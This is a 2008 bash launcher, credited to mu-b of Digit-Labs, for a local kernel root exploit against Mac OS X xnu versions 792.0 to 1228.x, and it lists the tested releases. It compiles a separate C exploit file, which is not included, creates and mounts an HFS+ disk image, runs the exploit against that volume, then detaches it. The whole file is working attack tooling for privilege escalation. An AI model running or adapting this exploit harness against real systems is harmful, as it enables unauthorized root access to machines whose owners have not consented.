#!/bin/bash
# * xnu-hfs-fcntl-v2.sh
# *
# * Copyright (c) 2008 by <mu-b@digit-labs.org>
# *
# * Apple MACOS X 792.0 <= xnu <= 1228.x local kernel root exploit
# * by mu-b - Sat 14 June 2008
# *
# * - Tested on: Apple MACOS X 10.4.8 (xnu-792.14.14.obj~1/RELEASE_I386)
# *              Apple MACOS X 10.4.9 (xnu-792.18.5~1/RELEASE_I386)
# *              Apple MACOS X 10.4.10 (xnu-792.22.5~1/RELEASE_I386)
# *              Apple MACOS X 10.4.11 (xnu-792.25.20~1/RELEASE_I386)
# *              Apple MACOS X 10.5.0 (xnu-1228~1/RELEASE_I386)
# *              Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
# *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
# *              Apple MACOS X 10.5.3 (xnu-1228.5.18~1/RELEASE_I386)
# *              Apple MACOS X 10.5.4 (xnu-1228.5.20~1/RELEASE_I386)
# *              Apple MACOS X 10.5.5 (xnu-1228.7.58~1/RELEASE_I386)
# *              Apple MACOS X 10.5.6 (xnu-1228.9.59~1/RELEASE_I386)
# *
# *    - Private Source Code -DO NOT DISTRIBUTE -
# * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
# *

IMAGE=xnu-hfs
EXPFILE=xnu-hfs-fcntl-v2

echo -en "Apple MACOS X xnu <= 1228.x local kernel root exploit\n" \
         "by: <mu-b@digit-labs.org>\n" \
         "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n"

if [ ! -f $EXPFILE ]; then
  echo -n "* compiling exploit..."
  gcc -Wall $EXPFILE.c -o $EXPFILE 2> /dev/null
  if [ $? != 0 ]; then
    echo " failed"
    exit $?
  else
    echo " done"
  fi
fi

if [ ! -f $IMAGE.dmg ]; then
  echo -n "* creating diskimage..."
  hdiutil create -megabytes 1 -fs HFS+ -volname $IMAGE $IMAGE.dmg > /dev/null
  if [ $? != 0 ]; then
    echo " failed"
    exit $?
  else
    echo " done"
  fi
fi

echo -n "* attaching/mounting diskimage..."
hdiutil attach $IMAGE.dmg > /dev/null
if [ $? != 0 ]; then
  echo " failed"
  exit $?
else
  echo " done"
fi

echo -e "* executing exploit...\n"
./$EXPFILE /Volumes/$IMAGE

echo -n "* detaching/unmounting diskimage..."
hdiutil detach /Volumes/$IMAGE > /dev/null
if [ $? != 0 ]; then
  echo " failed"
  exit $?
else
  echo " done"
fi
